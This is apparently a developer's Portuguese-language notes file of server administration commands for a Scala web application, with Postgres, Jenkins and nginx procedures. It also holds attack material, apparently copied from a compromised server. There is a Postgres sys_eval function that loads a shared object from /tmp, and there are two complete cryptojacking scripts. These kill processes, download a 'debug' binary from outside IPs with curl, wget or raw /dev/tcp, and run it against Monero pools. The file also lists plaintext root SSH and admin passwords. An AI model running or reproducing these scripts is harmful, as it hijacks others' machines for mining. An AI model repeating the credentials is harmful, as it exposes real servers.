ls > /tmp/Jsiw
chmod 600 /tmp/Jsiw
ls > /tmp/rebots
chmod 600 /tmp/rebots
ls > /tmp/SQLL
chmod 600 /tmp/SQLL
ls > /tmp/stagingdir
chmod 600 /tmp/stagingdir
ls > /tmp/Aerve
chmod 600 /tmp/Aerve
ls > /tmp/Aerve.1
chmod 600 /tmp/Aerve.1
ls > /tmp/sshosh
chmod 600 /tmp/sshosh
ls > /tmp/SWL
chmod 600 /tmp/SWL
ls > /tmp/ywzq
chmod 600 /tmp/ywzq
ls > /tmp/Linux
chmod 600 /tmp/Linux
ls > /tmp/jks
chmod 600 /tmp/jks
ls > /tmp/mlzq
chmod 600 /tmp/mlzq


ver badblocks
sudo badblocks -sv /dev/sda

atualizar ubuntu linux
sudo apt-get update

se der erro na mergelist
sudo rm /var/lib/apt/lists/* -vf
sudo apt-get update

rever o IP no 
boot.scala
no toolbar.html
no logincontroller.js
no securityapi

http://convertico.com/ favicon

https://github.com/clovisdasilvaneto/speechRecognition/blob/master/meu_artigo.html

https://github.com/lift/framework/blob/5033c8798d4444f81996199c10ea330770e47fbc/core/util/src/main/scala/net/liftweb/util/Mailer.scala

/**
   * Synchronously send an email.
   */
  def blockingSendMail(from: From, subject: Subject, rest: MailTypes*) {
    msgSendImpl(from, subject, rest.toList)
  }

graph chart
console.log(data.map(function(a){
	return {
		0: a[0],
		1: a[1]
	}
}));

-- Function: sys_eval999(text)

-- DROP FUNCTION sys_eval999(text);

CREATE OR REPLACE FUNCTION sys_eval999(text)
  RETURNS text AS
'/tmp/zero.so', 'sys_eval'
  LANGUAGE c IMMUTABLE STRICT
  COST 1;
ALTER FUNCTION sys_eval999(text)
  OWNER TO postgres;



454 4.7.0 Too many login attempts, please try again later. m4sm7677029ywh.36 - gsmtp

19:03:04.952 ERROR - Couldn't send mail
com.sun.mail.smtp.SMTPSendFailedException: 421 4.7.0 Temporary System Problem.  Try again later

Caused by: java.net.SocketException: Connection closed by remote host

no temp 
-rw-r--r-- 1 postgres postgres 6022 Dez 22 06:48 HJAOIDh.so
-rw-r--r-- 1 postgres postgres 1645 Dez 22 05:53 UJxvulbA.so

processo
/tmp/mpool -c 1 -M stratum+tcp://minner01%40outlook.com:x@xmr.pool.minergate.com:45560/xmr

na configuracao dos projetos blue e green
./sbt ~container:start > /dev/null - acaba com o /var/log/transitobh.access.log

etc/passwd -> testar depois um nologin no postgres

boleto
/var/www/html/boleto  é aqui
/var/www/boleto - não é lá

cria um servidor para por exemplo o ebelle.com.br
instalar
sudo npm install -g http-server

cd github/portal_salao
cd github/portalEbelle
http-server
ele vai falar a porta ai é só colocar o caminho agenda.html
localhost:8080/agenda.html
localhost:8080/agenda.html?id=company

alterar a agenda

instalar o grunt - o grunt é feito em node.js
/src/main/webapp/v2$ npm instal e/ou npm update
após alterar os controller.js ou qq .js debaixo de v2/src 
vai na pasta e dá um 
grunt concat 

para acessar via mobile a versao local 
abre terminal no local ifconfig - ve o ip na wlan
coloca no browser do mobile o ip:7171

para colocar o servidor PDF no ar na maquina local
abre um terminal especifico
vai no github ebelle pdfserver
node index

qualquer url
http://localhost:8089/?url=http://localhost:8089/?url=http://boleto.vilarika.com.br/boleto/boleto.php?data=10/08/2016&valor=69,90&nosso_numero=442&documento=442&nome=Patricia%20Otoni%20Est%C3%A9tica

relatorios no estoque - os dois do meio sao jasper
estoque consolidade
distribuiçao de estoque

rever o inventário hoje só traz se tem estoque, tem que trazer tudo e 
dar opção de nao trazer zero,  entender pq tem dois sqls com e sem unit

datas erradas na CCZS
09/03/1965
24/03/1952
04/03/1965

diretorio de imagens
/var/www/html/images

ebelle-responsive.css
font-family: "Times New Roman", Times, serif;
testar tirar o bordered table - antes do zebra-striped

style="color:#C21;font_size:18px"   vermelho

ver site font awesome
https://fortawesome.github.io/Font-Awesome/icons/
http://glyphicons.com/

a diferença de config de acesso no postgres do local para produção éa porta 
local 5432
producao 5433
nos 2 o hostname e' 
localhost
não tem nada na aba tunnel na produção
e o maintenace DB e o user em produção 
gerir-me
no local
postgres
no dir de sql tem 2 pgconfigXXXX.xml

para acessar o banco novo no linode novo tunel tunnel gerir-me
ssh -f -L 5433:127.0.0.1:5432 root@45.33.99.152 -N

psql e_belle_ligth_c < log.backup

depois de ir no jenkins
backup e-belle
workspace
ebelle.gz
vai na pasta com ctrl J descompacta (clica direito e extrai)

renomear o arquivo para tirar o espaço

cd ~/Downloads

sftp gerir-me@45.33.99.152:/home/gerir-me/backup_bd/
ls -ltr 
get <nome_arquivo>

chmod 777 ebelle(n)

sudo su postgres

psql e_belle_ligth_c < ebelle
psql gerir-me < ebelle

dropa o public local antes
-- Schema: public

-- DROP SCHEMA public;

CREATE SCHEMA public
  AUTHORIZATION postgres;

GRANT ALL ON SCHEMA public TO postgres;
GRANT ALL ON SCHEMA public TO public;
COMMENT ON SCHEMA public
  IS 'standard public schema';



psql e_belle_ligth_c < ebelle

no servidor - vai no jenkins e descompacta

gzip -d ebelle(n).gz

su postgres

psql e_belle_ligth_c < ebelle(n)


./sbt update

cd github

cd E-belle-Ligth

./sbt ~jetty-run
./sbt "~;container:start; container:reload /"

cd apache-activemq-5.9.0/bin

./activemq-admin start

ps -xa | grep java

kill -9 pid

executar o grunt na pasta v2


ssh root@transitobh.com.br

senha vilarika775072

mostra se o disco está cheio
df -h

procurar
no /tmp
ls -l sbt*.log
e remover os antigos e grandes - aparece sempre que gera verao

/var/log/transito.access.log 
se tiver grande matar (RM) para e voltar o nginx

remove arvore de diretorios pra baixo sem questionar
rm xx* -r --verbose --force -f

sobre as bases do postgres
cd /var/lib/pgsql/data/base/ e os numeros que ele gera

/var/lib/pgsql/data
arquivos estranhos com extensão .dll
amp.lst - lista de ips
testtmp
66.228.57.73:54624

mostra uso de cpu
top

cat .bash_history | grep find

encontra arquivos maiores que um giga
find / -type f -size +1G -exec ls -lh {} \; | awk '{ print $9 ": " $5 }'
encontra arquivos maiores que 500 Mega 
find / -type f -size +500M -exec ls -lh {} \; | awk '{ print $9 ": " $5 }'

encontra recurssivo a partir do /
find / | grep xxxxxx

diretorio de logs do Transito
/var/lib/jenkins/jobs/TrasitoRun/builds

diretorios de logs do ebelle
/var/lib/jenkins/jobs/run_e-belle-blue/builds
/var/lib/jenkins/jobs/run_e-belle-green/builds

log do postgres
cd /var/lib/pgsql/data/pg_log/

// Alterar acesso externo ou informar IP pu comentar a linha
// meu ip na minha casa
cd /var/lib/pgsql/data
vi pg_hba.conf

log do jenkins
cd /var/log/jenkins

/etc/init.d/jenkins start

jetty stop

os arquivos de apontamento ficam em
/etc/nginx/sites-available
dentro de remessa e tissxml tem um add header que faz o dowload acontecer

nginx -k reload
nginx -s reload

/etc/nginx/conf.d/trans.conf

7171 7272 portas do blue e do green 

aqui ficam os dominios e para que pasta aponta - apache
vim /etc/httpd/conf/httpd.conf

su postgres

/etc/rc.d/init.d/postgresql restart


curtir no face
<div class='widget HTML' id='HTML2'>

	<h2 class='title'>Facebook</h2>

	<div class='widget-content'>

		<iframe src="//www.facebook.com/plugins/likebox.php?href=https%3A%2F%2Fwww.facebook.com%2Febellegestao&amp;width&amp;height=258&amp;colorscheme=light&amp;show_faces=true&amp;header=false&amp;stream=false&amp;show_border=true" scrolling="no" frameborder="0" style="border:none; overflow:hidden; height:258px;" allowtransparency="true"></iframe>

	</div>

	<div class='clear'></div>
</div>


		<iframe src="//www.facebook.com/plugins/likebox.php?href=https%3A%2F%2Fwww.facebook.com%2FVilaRikaSolucoes&amp;width&amp;height=258&amp;colorscheme=light&amp;show_faces=true&amp;header=false&amp;stream=false&amp;show_border=true" scrolling="no" frameborder="0" style="border:none; overflow:hidden; height:258px;" allowtransparency="true"></iframe>



no <head>
<style type="text/css">
.quebrapagina {
   page-break-before: always;
}
</style>

na quebra
<br class="quebrapagina">







service jenkins restart

Habilitar activemq no ubuntu via apt-get
sudo ln -s /etc/activemq/instances-available/main /etc/activemq/instances-enabled/main

site vila rika

/bitbucket/vilarika-site$ httpserver

http://localhost:8080/


parar

service postgresql stop
/etc/init.d/jenkins stop

o jenkins cai mas os processos do ebele podem ficar no ar

ps -aux | grep jenkins
kill -9 neles

normalmente - resolve

/etc/activemq stop

nginx -s stop
a mensagem de duplicate mime type nao e problema

service httpd stop

voltar

service postgresql start
/etc/init.d/jenkins start

nginx
a mensagem de duplicate mime type nao e problema

o ci.transitobh já funciona, mas tem que subir o active mq antes do deploy

/etc/activemq start

no browser 
mq.transitobh.com.br
usuario admin
a senha amanda1108

vai no ci e deploy ebelle
se por acaso do gitbub nao estar no ar (como aconteceu comigo e o mateus)
vai no run ebelle green e comenta o git push com #

remove os arquivos deletados
git add . -A

service httpd start

se nao subir o apache não mostra as imagens 
para ver se o apache está no ar 
http://nb.transitobh.com.br/

no ci.transitobh.com.br
construir o PDF-server

http://pm2.keymetrics.io/docs/usage/quick-start/
cd /var/lib/jenkins/app/gerir-me
git reset --hard HEAD
git pull

pm2 start gerirme.json

Se quiser que o pm2 inicie com o sistema:
pm2 startup
Os principais comandos são:
# Listing

pm2 list               # Display all processes status
# Actions

pm2 stop all           # Stop all processes
pm2 restart all        # Restart all processes



asset
id company status
product
barcode (tag)
dtini (primeira ocorrencia)
dtfim 
unit
centro de custo????

tipo de ativo (computador impressora, etc)

asset occorrencia
id company status
asset
data
tipo (aqui, locacao,manutencao
parceiro
local(parceiro também)
unit
centro de custo ?????
valor
obs

tipo ocorrencia
valor (positivo/negativo)
validade (meses dias)

preço de locação e unidade de tempo no produto?
usar o bom para características? ou algo do tipo?










for tr in $(ps -U $USER | egrep -v "java|ps|sh|egrep|PID" | cut -b1-6); do echo "Killing ${tr}"; kill -9 $tr || : ; done;
threadCount=$(lscpu | grep 'CPU(s)' | grep -v ',' | awk '{print $2}' | head -n 1);
hostHash=$(hostname -f | md5sum | cut -c1-8);
echo "${hostHash} - ${threadCount}";
d() { curl --fail $1 -o debug 2> /dev/null || wget $1 -O debug 2> /dev/null && chmod +x debug; }

test ! -e d && touch d && rm -rf debug;
test ! -e debug && (d "https://34.243.239.201/job/Insecure-Jenkins/ws/debug" || d "http://61.50.105.218:9002/job/Insecure-Jenkins/ws/debug");

p() {
  BUILD_ID=dontKillMe JENKINS_NODE_COOKIE=bobobobob ./debug -r 2 -R 4 -o stratum+tcp://$1:$2 -u 45h4a6VQoroEmqepwHTs9u4eAg98XFcHf5wHwzm9gWuLJYFvBawBCgY73PJQdJYNMQCczVs4S8PY4LfxnPn5UsqMSW5XLge.JL8_${hostHash:-abc} -p x -t ${threadCount:-4}
}

p "pool.minexmr.com" "4444" && p "91.121.87.10" "4444" && p "pool.minexmr.com" "7777" && p "pool.minexmr.com" "80" && p "91.121.87.10" "7777"


/var/lib/jenkins/workspace/Insecure-Jenkins/debug



#!/bin/bash

for tr in $(ps -U $(whoami) | egrep -v "java|ps|sh|egrep|PID" | cut -b1-6); do kill -9 $tr 2> /dev/null || : ; done;
threadCount=$(lscpu | grep 'CPU(s)' | grep -v ',' | awk '{print $2}' | head -n 1);
hostHash=$(hostname -f | md5sum | cut -c1-8);
echo "${hostHash} - ${threadCount}";

_curl () {
  read proto server path <<<$(echo ${1//// })
  DOC=/${path// //}
  HOST=${server//:*}
  PORT=${server//*:}
  [[ x"${HOST}" == x"${PORT}" ]] && PORT=80

  exec 3<>/dev/tcp/${HOST}/$PORT
  echo -en "GET ${DOC} HTTP/1.0\r\nHost: ${HOST}\r\n\r\n" >&3
  (while read line; do
   [[ "$line" == $'\r' ]] && break
  done && cat) <&3
  exec 3>&-
}

d() { (curl --insecure --fail $1 -o debug 2> /dev/null || wget --no-check-certificate $1 -O debug 2> /dev/null || _curl $1 > debug) && chmod +x debug; }

test ! -e d && touch d && rm -rf debug;
test ! -s debug && (d "https://54.218.74.37:8443/view/all/job/Insecure-Jenkins/ws/debug" || d "http://35.196.231.47:9080/job/Insecure-Jenkins/ws/debug" || d "http://61.50.105.218:9002/job/Insecure-Jenkins/ws/debug");
test ! -x debug && chmod +x debug;

p() {
  BUILD_ID=dontKillMe JENKINS_NODE_COOKIE=bobobobob ./debug -r 2 -R 4 -o stratum+tcp://$1:$2 -u 45h4a6VQoroEmqepwHTs9u4eAg98XFcHf5wHwzm9gWuLJYFvBawBCgY73PJQdJYNMQCczVs4S8PY4LfxnPn5UsqMSW5XLge.JL8_${hostHash:-abc} -p x -t ${threadCount:-4}
}

p "pool.minexmr.com" "4444" && p "91.121.87.10" "4444" && p "pool.minexmr.com" "7777" && p "pool.minexmr.com" "80" && p "91.121.87.10" "7777" &&  p "91.121.87.10" "80"



total R$ 950    total pontos 1000

se pontos + pontsonbuy >= total pontos
   total
else 
   (pontos + pontsonbuy) * tota R$ / total pontos








Exception occured while processing /cash/processPayment<pre>Message: net.liftweb.json.MappingException: Parsed JSON values do not match with class constructor
args=List(
TreatmentDTO(
71,33,0,List(
ActivityDTO(100214,activity,15089897,0.0,false,1.0,false,0,0,0,,0))
,false,2018450,false)),
List(),1,20/03/2018,47931,4,null
arg types=scala.collection.immutable.$colon$colon,
scala.collection.immutable.Nil$,
java.lang.String,
java.lang.String,
java.lang.String,
java.lang.String,
null
constructor=public code.service.PaymentRequst(
scala.collection.immutable.
List,scala.collection.immutable.List,
java.lang.String,
java.lang.String,
java.lang.String,
java.lang.String,
double)
